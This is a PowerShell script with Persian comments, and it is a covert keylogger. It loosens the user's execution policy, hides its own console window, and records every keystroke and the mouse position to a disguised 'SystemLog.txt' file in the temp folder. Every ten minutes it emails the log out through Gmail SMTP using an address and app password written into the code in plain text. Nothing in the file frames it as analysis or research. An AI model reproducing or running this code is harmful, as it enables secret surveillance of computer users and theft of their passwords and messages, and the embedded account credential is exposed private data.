# بررسی و تنظیم ExecutionPolicy اگر نیاز باشد
$currentPolicy = Get-ExecutionPolicy -Scope CurrentUser
if ($currentPolicy -eq "Restricted") {
    Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
}

# مخفی کردن پنجره PowerShell
try {
    Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        public class Window {
            [DllImport("kernel32.dll")]
            static extern IntPtr GetConsoleWindow();
            
            [DllImport("user32.dll")]
            static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
            
            public static void Hide() {
                var handle = GetConsoleWindow();
                ShowWindow(handle, 0);
            }
        }
"@ -ErrorAction SilentlyContinue
    [Window]::Hide()
} catch {
    # اگر مخفی کردن پنجره شکست خورد، ادامه بده
}

# تنظیمات اصلی
$LogPath = "$env:TEMP\SystemLog.txt"
$Interval = 600
$GmailUser = "lalqalandar310@gmail.com"
$GmailPass = "fmwh vght myzb xcgp"
$SMTPServer = "smtp.gmail.com"
$SMTPPort = 587

# ثبت کلیدهای فشرده شده با استفاده از WinAPI
try {
    Add-Type -MemberDefinition @'
        [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
        public static extern short GetAsyncKeyState(int virtualKeyCode);
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        public static extern bool GetCursorPos(ref System.Drawing.Point pt);
'@ -Name Win32 -Namespace Api -ErrorAction SilentlyContinue
} catch {
    "Error loading WinAPI: $($_.Exception.Message)" | Out-File "$env:TEMP\script_errors.log" -Append
    exit
}

# تابع برای تبدیل کد مجازی به نام کلید
function Get-KeyName {
    param($keyCode)
    $keyMap = @{
        8 = "Backspace"; 9 = "Tab"; 13 = "Enter"; 32 = "Space"; 27 = "Escape";
        37 = "LeftArrow"; 38 = "UpArrow"; 39 = "RightArrow"; 40 = "DownArrow";
        46 = "Delete"; 91 = "Win"; 162 = "Ctrl"; 163 = "Ctrl"; 164 = "Alt"; 165 = "Alt"
    }
    if ($keyMap.ContainsKey($keyCode)) {
        return $keyMap[$keyCode]
    } elseif ($keyCode -ge 65 -and $keyCode -le 90) {
        return [char]$keyCode
    } else {
        return "Key$keyCode"
    }
}

# تابع برای ارسال ایمیل با تلاش مجدد
function Send-EmailWithRetry {
    param($BodyContent)
    $maxRetries = 3
    $retryCount = 0
    $success = $false
    
    while (-not $success -and $retryCount -lt $maxRetries) {
        try {
            $secPass = ConvertTo-SecureString $GmailPass -AsPlainText -Force
            $cred = New-Object System.Management.Automation.PSCredential ($GmailUser, $secPass)
            Send-MailMessage -From $GmailUser -To $GmailUser -Subject "System Report $(Get-Date)" `
                -Body $BodyContent -SmtpServer $SMTPServer -Port $SMTPPort -UseSsl -Credential $cred
            $success = $true
            "Report sent at $(Get-Date)" | Out-File "$env:TEMP\script_status.log" -Append
        } catch {
            $retryCount++
            if ($retryCount -eq $maxRetries) {
                "Failed to send email after $maxRetries attempts: $($_.Exception.Message)" | Out-File "$env:TEMP\script_errors.log" -Append
            } else {
                Start-Sleep -Seconds 10
            }
        }
    }
    return $success
}

# حلقه اصلی برای ثبت فعالیت‌ها
while ($true) {
    $logEntries = @()
    $startTime = Get-Date

    while ((Get-Date) - $startTime -lt (New-TimeSpan -Seconds $Interval)) {
        # ثبت موقعیت ماوس
        $point = New-Object System.Drawing.Point
        try {
            [Api.Win32]::GetCursorPos([ref]$point)
            $mousePos = "Mouse: X=$($point.X), Y=$($point.Y)"
        } catch {
            $mousePos = "Mouse: Unable to get position"
        }

        # بررسی کلیدهای فشرده شده
        1..254 | ForEach-Object {
            try {
                $state = [Api.Win32]::GetAsyncKeyState($_)
if ($state -eq -32767) {
                    $keyName = Get-KeyName $_
                    $timeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    $logEntry = "[$timeStamp] Key: $keyName | $mousePos"
                    $logEntries += $logEntry
                    
                    # ذخیره موقت در فایل برای جلوگیری از از دست رفتن داده
                    $logEntry | Out-File $LogPath -Append
                }
            } catch {
                # خطا در ثبت کلید - ادامه بده
            }
        }
        Start-Sleep -Milliseconds 100
    }

    # ارسال ایمیل اگر فعالیتی ثبت شده باشد
    if ($logEntries.Count -gt 0) {
        $body = $logEntries -join "`n"
        $emailSent = Send-EmailWithRetry $body
        
        if (-not $emailSent) {
            "Failed to send email at $(Get-Date). Data saved locally." | Out-File "$env:TEMP\script_errors.log" -Append
        }
    }
}